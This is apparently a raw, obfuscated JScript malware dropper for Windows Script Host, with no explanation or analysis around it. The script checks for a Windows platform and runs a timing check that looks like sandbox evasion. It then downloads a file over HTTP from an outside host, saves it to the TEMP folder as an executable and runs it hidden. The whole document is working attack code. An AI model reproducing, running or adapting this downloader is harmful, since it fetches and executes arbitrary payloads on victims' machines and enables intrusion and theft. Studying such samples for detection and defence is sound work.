var A = false;
var Sf = "CreateObject";
var M = function kS() {return WScript[Sf]("WScript.Shell");}(), g = 11;
var L = "MSXML2.XMLHTTP";
var T = 2123213;
var XM = 0;
function AR(VX){M["Run"](VX, XM, XM);};
function ax(){return "" + L;};
function jI(A0, s){XM = XM * 1; return A0 - s;};
function ME(){return Sf;};
/*@cc_on
  @if (@_win32 || @_win64)
    A = true;
  @end
@*/
if (A)
{
var K = "";
function p(){return 22;};
var K0 = 0; var mt = 0;
function O()
{
var o = new this["Date"]();
var yJ = o["getUTCMilliseconds"]();
WScript["Sleep"](p());
var o = new this["Date"]();
var uU = o["getUTCMilliseconds"]();
WScript["Sleep"](p());
var o = new this["Date"]();
var m = o["getUTCMilliseconds"]();
var K0 = "D";
K0 = jI(uU, yJ);
var mt = "aa";
mt = jI(m, uU);
K = "open";
return jI(K0, mt);
}
var o0 = false;
var b0 = false;
for (var G = XM; G < p() * 1; G++){if (O() != XM){
o0 = true; 
mt = "31" + 11 * K0 + mt; 
b0 = true; 
break;
}}
function DR() {return ((o0 == true) && (o0 == b0)) ? 1 : XM;};
if (o0 && DR() && b0){
function np() {return M["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Rj67rewYjdO5la1K.exe";};
 yd = ax();
 tw = WScript[Sf](yd);
 var bw = 1;
 while (bw){
try {
tw[K]("GET", "http://www.aluguerdiadema.com/p9wsld", false);
tw["send"]();
S = "Sleep";
for (;;){WScript[S](p() * 11); if (tw["readystate"] >= 2 * 2) break;};
bw = XM;
} catch(I){};
}
function b(rs) {var Z = (1, 2, 3, 4, 5, rs); return Z;};
Se = WScript[ME()]("ADODB.Stream");
yd = Se;
yd[K]();
yd["type"] = b(1);
yd["write"](tw["ResponseBody"]);
Se["position"] = b(XM);
yd["Save" + "ToFile"](np(), 2);
Se["c"+"lose"]();
zr = np();
AR(zr);
}
}

